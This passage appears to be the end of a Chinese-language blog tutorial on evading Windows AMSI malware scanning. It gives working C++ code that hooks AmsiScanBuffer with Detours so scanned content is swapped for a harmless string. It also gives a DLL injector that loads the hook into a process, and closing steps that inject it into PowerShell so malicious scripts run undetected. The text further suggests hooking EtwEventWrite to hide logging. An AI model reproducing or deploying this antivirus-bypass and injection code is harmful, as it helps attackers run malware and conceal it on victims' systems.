    }
    //Sets up detours to hook our function
    void HookAmsi() {
        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
        DetourTransactionCommit();
    }
    //Undoes the hooking we setup earlier
    void UnhookAmsi() {
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
        DetourTransactionCommit();
    }
    int main() {
        //Declares variables required for AmsiInitialize, AmsiOpenSession, and AmsiScanBuffer
        HAMSICONTEXT amsiContext;
        HRESULT hResult = S_OK;
        AMSI_RESULT res = AMSI_RESULT_CLEAN;
        HAMSISESSION hSession = nullptr;
        //Declare test case to use
        LPCWSTR fname = L"EICAR";
        BYTE* sample = (BYTE*)EICAR;
        ULONG size = strlen(EICAR);
        std::cout 
    #include 
    #include 
    //Opens a handle to process then write to process with LoadLibraryA and execute thread
    BOOL InjectDll(DWORD procID, char* dllName) {
        char fullDllName[MAX_PATH];
        LPVOID loadLibrary;
        LPVOID remoteString;
        if (procID == 0) {
            return FALSE;
        }
        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
        if (hProc == INVALID_HANDLE_VALUE) {
            return FALSE;
        }
        GetFullPathNameA(dllName, MAX_PATH, fullDllName, NULL);
        std::cout 
    #include 
    #include 
    #include 
    #pragma comment(lib, "amsi.lib")
    #define SAFE "SafeString"
    static HRESULT(WINAPI* OriginalAmsiScanBuffer)(HAMSICONTEXT amsiContext,
        PVOID buffer, ULONG length,
        LPCWSTR contentName,
        HAMSISESSION amsiSession,
        AMSI_RESULT* result) = AmsiScanBuffer;
    //Our user controlled AmsiScanBuffer
    __declspec(dllexport) HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,
        PVOID buffer, ULONG length,
        LPCWSTR contentName,
        HAMSISESSION amsiSession,
        AMSI_RESULT* result) {
        std::cout << "[+] AmsiScanBuffer called" << std::endl;
        std::cout << "[+] Buffer " << buffer << std::endl;
        std::cout << "[+] Buffer Length " << length << std::endl;
        return OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);
    }
    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  dwReason,
        LPVOID lpReserved
    )
    {
        if (DetourIsHelperProcess()) {
            return TRUE;
        }
        if (dwReason == DLL_PROCESS_ATTACH) {
            AllocConsole();
            freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
            DetourRestoreAfterWith();
            DetourTransactionBegin();
            DetourUpdateThread(GetCurrentThread());
            DetourAttach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
            DetourTransactionCommit();
        } else if (dwReason == DLL_PROCESS_DETACH) {
            DetourTransactionBegin();
            DetourUpdateThread(GetCurrentThread());
            DetourDetach(&(PVOID&)OriginalAmsiScanBuffer, _AmsiScanBuffer);
            DetourTransactionCommit();
            FreeConsole();
        }
        return TRUE;
    }
  * 将AmsiHOOK.dll注入到powershell进程中。  
  * 现在我们可以输入任何恶意脚本给powershell执行了且不会被拦截，这个项目只是一个基础，你可以做相当多的扩展，如hook EtwEventWrite函数去隐藏日志记录等等。
  * 下一篇给大家分享另外一种更简单的绕过姿势。
## Reference
[Understanding and Bypassing AMSI](https://x64sec.sh/understanding-and-bypassing-amsi/)  
[初探Powershell与AMSI检测对抗技术](https://www.anquanke.com/post/id/168210)